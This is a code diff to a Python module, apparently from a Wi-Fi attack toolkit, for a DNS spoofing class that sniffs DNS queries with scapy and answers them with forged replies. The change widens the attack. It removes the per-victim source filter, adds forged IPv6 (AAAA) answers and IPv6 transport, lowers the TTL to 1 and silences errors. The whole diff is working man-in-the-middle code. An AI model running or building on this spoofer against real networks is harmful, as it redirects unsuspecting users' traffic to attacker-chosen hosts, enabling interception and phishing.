@@ -2,13 +2,12 @@ import logging
 from threading import Event, Lock, Thread
 
 try:
-    from dnslib import DNSRecord, RR, QTYPE, A
+    from dnslib import DNSRecord, RR, QTYPE, A, AAAA
     DNSLIB_OK = True
 except ImportError:
     DNSLIB_OK = False
 
 log = logging.getLogger("szr-wifi")
-
 
 class DnsSpoofAlt:
     def __init__(self, ctx, iface, spoof_ip="10.0.0.1"):
@@ -37,44 +36,50 @@ class DnsSpoofAlt:
             self.thread.join(timeout=2)
 
     def _loop(self):
-        from scapy.all import sniff, send, IP, UDP, DNS
+        from scapy.all import sniff, send, IP, UDP, DNS, IPv6
         def cb(p):
             try:
-                if not p.haslayer(IP) or not p.haslayer(UDP):
+                if not p.haslayer(UDP) or not p.haslayer(DNS):
                     return
-                if p[UDP].dport != 53:
-                    return
-                if not p.haslayer(DNS):
-                    return
+                
                 dns = p[DNS]
-                if dns.qr != 0:
+                if dns.qr != 0 or dns.qd is None:
                     return
-                if dns.qd is None:
-                    return
-                if self.filtre and p[IP].src not in self.filtre:
-                    return
+
                 try:
                     q = DNSRecord.parse(bytes(dns))
                 except Exception:
                     return
+                
                 qname = str(q.q.qname)
                 cevap = q.reply()
-                cevap.add_answer(RR(qname, QTYPE.A, rdata=A(self.spoof_ip),
-                                    ttl=60))
-                ip = IP(src=p[IP].dst, dst=p[IP].src)
+                
+                if q.q.qtype == QTYPE.A:
+                    cevap.add_answer(RR(qname, QTYPE.A, rdata=A(self.spoof_ip), ttl=1))
+                elif q.q.qtype == QTYPE.AAAA:
+                    cevap.add_answer(RR(qname, QTYPE.AAAA, rdata=AAAA("::1"), ttl=1))
+                else:
+                    return
+
+                if p.haslayer(IP):
+                    ip = IP(src=p[IP].dst, dst=p[IP].src)
+                elif p.haslayer(IPv6):
+                    ip = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
+                else:
+                    return
+
                 udp = UDP(sport=53, dport=p[UDP].sport)
                 send(ip / udp / cevap, verbose=False)
+                
                 with self.lock:
                     self.sayac += 1
                     if self.sayac % 20 == 0:
-                        self.ctx.log(f"[dns] {self.sayac} yanıt → "
-                                     f"{self.spoof_ip}", "dim")
-            except Exception as e:
-                log.debug("dns cb: %s", e)
+                        self.ctx.log(f"[dns] {self.sayac} yanıt (TTL=1)", "dim")
+            except Exception:
+                pass
 
         sniff(iface=self.iface, prn=cb, store=False,
-              stop_filter=lambda p: self.dur.is_set(),
-              filter="udp port 53")
+              stop_filter=lambda p: self.dur.is_set(), filter="port 53")
 
     def durum(self):
         return "active" if (self.thread and self.thread.is_alive()) else "off"
